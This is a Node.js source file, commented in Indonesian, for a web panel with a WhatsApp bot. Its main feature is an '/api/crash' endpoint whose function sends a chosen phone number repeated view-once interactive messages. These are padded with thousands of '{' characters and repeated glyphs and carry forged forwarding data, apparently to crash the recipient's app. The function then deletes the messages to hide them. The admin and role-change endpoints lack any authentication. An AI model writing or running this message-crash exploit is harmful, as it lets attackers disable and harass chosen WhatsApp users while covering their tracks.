const express = require("express");
const cors = require("cors");
const path = require("path");
const pino = require("pino");
const chalk = require("chalk");
const crypto = require("crypto");
const readline = require("readline");
const fs = require("fs");
const fetch = require("node-fetch");
const { RateLimiterMemory } = require("rate-limiter-flexible");

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  makeCacheableSignalKeyStore,
} = require("@whiskeysockets/baileys");

const app = express();
const PORT = process.env.PORT || 3000;

// ====== GLOBAL CONFIG ======
const usePairingCode = true; // set true kalau mau pairing code
let sock = null;

// ====== UTILS ======
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function question(query) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  return new Promise((resolve) =>
    rl.question(query, (ans) => {
      rl.close();
      resolve(ans);
    })
  );
}

const loadUsers = () =>
  fs.existsSync("./users.json")
    ? JSON.parse(fs.readFileSync("./users.json", "utf8"))
    : [];
const saveUsers = (data) =>
  fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

// ====== EXPRESS CONFIG ======
app.use(express.json());
app.use(cors());
app.use(express.static("public"));

// ====== API ROUTES ======
app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  if (!phone || !role)
    return res.status(400).json({ success: false, message: "Phone & role required" });

  const users = loadUsers();
  users.push({ phone, role });
  saveUsers(users);
  res.json({ success: true, message: "User added." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  if (!phone)
    return res.status(400).json({ success: false, message: "Phone required" });

  const users = loadUsers();
  users.push({ phone, role: "admin" });
  saveUsers(users);
  res.json({ success: true, message: "Admin added." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  if (!phone || !newRole)
    return res.status(400).json({ success: false, message: "Phone & newRole required" });

  const users = loadUsers();
  const user = users.find((u) => u.phone === phone);
  if (user) {
    user.role = newRole;
    saveUsers(users);
    res.json({ success: true, message: "Role updated." });
  } else {
    res.status(404).json({ success: false, message: "User not found." });
  }
});

// ====== FUNCTION CRASH BUG ======
async function ElContol(sock, target, count = 3) {
  const messageIds = [];

  for (let i = 0; i < count; i++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 99999999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "📄Null Tanggapan Diterima" + "ꦽ".repeat(7777),
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(9999),
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_call",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_copy",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_reminder",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_cancel_reminder",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "address_message",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "send_location",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "ꦽ".repeat(3000),
                    version: 3,
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({ status: true }),
                    version: 3,
                  },
                  {
                    name: "camera_permission_request",
                    buttonParamsJson: JSON.stringify({ cameraAccess: true }),
                    version: 3,
                  },
                ],
              },
            },
          },
        },
      };

      const msg = await sock.sendMessage(target, message);
      const messageId = msg.key.id;
      messageIds.push(messageId);

      console.log(`✅ [${i + 1}/${count}] Crash terkirim: ${messageId}`);
      await sleep(600);
    } catch (e) {
      console.error("❌ Error Crash:", e);
    }
  }

  // hapus semua pesan setelah dikirim
  for (let i = 0; i < messageIds.length; i++) {
    const id = messageIds[i];
    await sleep(1000);
    await sock.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: false,
        id,
        participant: sock.user.id,
      },
    });
    console.log(`🗑️ Pesan ${i + 1} dihapus`);
  }

  console.log("✅ Semua pesan crash sudah dihapus");
}

app.post("/api/crash", async (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res
      .status(400)
      .json({ success: false, message: "Target number is required." });
  }

  try {
    await ElContol(sock, target); // ✅ pakai sock yg sudah connect
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    res
      .status(500)
      .json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

// ====== WHATSAPP CLIENT ======
async function clientStart() {
  const { state, saveCreds } = await useMultiFileAuthState("session");

  const baileyVersion = await (
    await fetch(
      "https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json"
    )
  ).json();

  sock = makeWASocket({
    printQRInTerminal: !usePairingCode,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    keepAliveIntervalMs: 10000,
    generateHighQualityLinkPreview: true,
    patchMessageBeforeSending: (message) => {
      if (message.buttonsMessage || message.templateMessage || message.listMessage) {
        message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {},
              },
              ...message,
            },
          },
        };
      }
      return message;
    },
    version: baileyVersion, // ✅ langsung array version, bukan .version
    browser: ["web-bug-vexebew", "Chrome", "20.0.04"],
    logger: pino({ level: "fatal" }),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(
        state.keys,
        pino().child({ level: "silent", stream: "store" })
      ),
    },
  });

  sock.ev.on("creds.update", saveCreds);

  if (!sock.authState.creds.registered && usePairingCode) {
    const phoneNumber = await question(
      "Please enter your WhatsApp number (start with 62):\n"
    );
    const code = await sock.requestPairingCode(phoneNumber.trim());
    console.log(chalk.blue.bold(`Your pairing code: ${code}`));
  }

  sock.ev.on("connection.update", ({ connection, lastDisconnect }) => {
    if (connection === "connecting")
      return console.log(chalk.yellow("Connecting..."));
    if (connection === "open")
      return console.log(chalk.green("✅ WhatsApp Bot connected"));

    if (connection === "close") {
      const reason =
        lastDisconnect?.error?.output?.statusCode ||
        lastDisconnect?.error?.message;
      console.log(chalk.red("Connection closed:", reason));

      if (reason !== DisconnectReason.loggedOut) {
        console.log(chalk.yellow("Reconnecting..."));
        setTimeout(clientStart, 3000);
      } else {
        console.log(
          chalk.red("Logged out. Delete session folder for re-pairing.")
        );
      }
    }
  });
}

// ====== START ======
clientStart().catch((err) => console.error("Gagal connect bot:", err));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
